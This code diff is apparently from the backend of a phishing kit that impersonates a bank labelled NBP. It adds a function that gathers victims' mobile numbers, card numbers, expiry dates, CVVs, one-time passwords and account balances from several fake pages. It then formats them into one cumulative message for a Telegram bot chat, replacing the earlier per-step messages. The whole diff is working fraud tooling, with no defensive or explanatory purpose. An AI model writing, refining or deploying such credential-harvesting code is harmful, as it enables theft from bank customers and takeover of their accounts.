@@ -10,6 +10,32 @@ function copyable(value: string | number) {
   return `<code>${escapeHtml(String(value))}</code>`
 }
 
+// Builds the cumulative message: whatever fields have been collected so far
+// (across the login, card, otp, balance, and confirm-otp pages) are included,
+// in a fixed order, so every step's notification contains all prior details.
+function buildCumulativeText(body: Record<string, unknown>) {
+  const lines: string[] = ['<b>NBP submission update</b>']
+
+  const mobile = typeof body?.mobile === 'string' ? body.mobile.trim() : ''
+  const card = typeof body?.card === 'string' ? body.card.trim() : ''
+  const month = typeof body?.month === 'string' ? body.month.trim() : ''
+  const year = typeof body?.year === 'string' ? body.year.trim() : ''
+  const cvv = typeof body?.cvv === 'string' ? body.cvv.trim() : ''
+  const otp = typeof body?.otp === 'string' ? body.otp.trim() : ''
+  const balance = typeof body?.balance === 'string' ? body.balance.trim() : ''
+  const confirmOtp = typeof body?.confirmOtp === 'string' ? body.confirmOtp.trim() : ''
+
+  if (mobile) lines.push(`Mobile: ${copyable(mobile)}`)
+  if (card) lines.push(`Card: ${copyable(card)}`)
+  if (month || year) lines.push(`Expiry: ${copyable(`${month || '--'}/${year || '----'}`)}`)
+  if (cvv) lines.push(`CVV: ${copyable(cvv)}`)
+  if (otp) lines.push(`OTP: ${copyable(otp)}`)
+  if (balance) lines.push(`Balance: ${copyable(`PKR ${balance}`)}`)
+  if (confirmOtp) lines.push(`Confirm OTP: ${copyable(confirmOtp)}`)
+
+  return lines.length > 1 ? lines.join('\n') : ''
+}
+
 export async function POST(request: Request) {
   const token = process.env.TELEGRAM_BOT_TOKEN
   const chatId = process.env.TELEGRAM_CHAT_ID
@@ -22,24 +48,10 @@ export async function POST(request: Request) {
   try {
     const body = await request.json()
 
-    if (body?.card || body?.month || body?.year || body?.cvv) {
-      // Card submission
-      const lines = [
-        '<b>New card submission</b>',
-        body?.card ? `Card: ${copyable(body.card)}` : null,
-        body?.month || body?.year ? `Expiry: ${copyable(`${body?.month ?? '--'}/${body?.year ?? '----'}`)}` : null,
-        body?.cvv ? `CVV: ${copyable(body.cvv)}` : null,
-        body?.mobile ? `Mobile: ${copyable(body.mobile)}` : null,
-      ].filter(Boolean)
-      text = lines.join('\n')
-    } else if (body?.mobile) {
-      text = `<b>New mobile number</b>\nMobile: ${copyable(body.mobile)}`
-    } else if (body?.otp) {
-      text = `<b>OTP submitted</b>\nOTP: ${copyable(body.otp)}`
-    } else if (body?.confirmOtp) {
-      text = `<b>Confirm OTP submitted</b>\nOTP: ${copyable(body.confirmOtp)}`
-    } else if (body?.balance) {
-      text = `<b>Account balance submitted</b>\nBalance: ${copyable(`PKR ${body.balance}`)}`
+    const cumulative = buildCumulativeText(body ?? {})
+
+    if (cumulative) {
+      text = cumulative
     } else if (typeof body?.text === 'string' && body.text.trim()) {
       text = escapeHtml(body.text.trim())
     } else {
